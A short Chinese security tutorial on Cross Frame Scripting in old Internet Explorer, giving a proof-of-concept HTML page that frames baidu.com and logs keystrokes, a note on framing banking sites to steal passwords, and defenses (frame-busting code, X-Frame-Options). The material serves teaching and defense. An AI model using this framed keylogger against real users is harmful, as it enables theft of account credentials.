### 原理

```html
<html>
<head>
<title>IE Cross Frame Scripting Restriction Bypass Example</title>
<script>
var keylog='';
document.onkeypress = function () {
   k = window.event.keyCode;
   window.status = keylog += String.fromCharCode(k) + '[' + k +']';
}
</script>
</head>
<frameset onload="this.focus();" onblur="this.focus();" cols="100%">
<frame src="http://www.baidu.com/" scrolling="auto">
</frameset>
</html>
```

当你在百度的搜索框输入字符时，你会发现左下角的状态栏上出现了你输入的字符。

利用浏览器允许框架(frame)跨站包含其它页面的漏洞，在主框架的代码中加入scirpt，监视、盗取用户输入。

### 危害

一个恶意的站点可以通过用框架包含真的网银或在线支付网站，获取用户账号和密码。

### 防御

* user：升级到IE7以上浏览器
* 开发者：
  * 在页面中加入以下javascirpt代码可以避免网站被XFS`if (top != self)  {top.location=self.location;}`，该代码在检测到当前页面被跨域嵌入iframe时，会重定向到本页面
  * 设置http响应头X-Frame-Options:SAMEORIGIN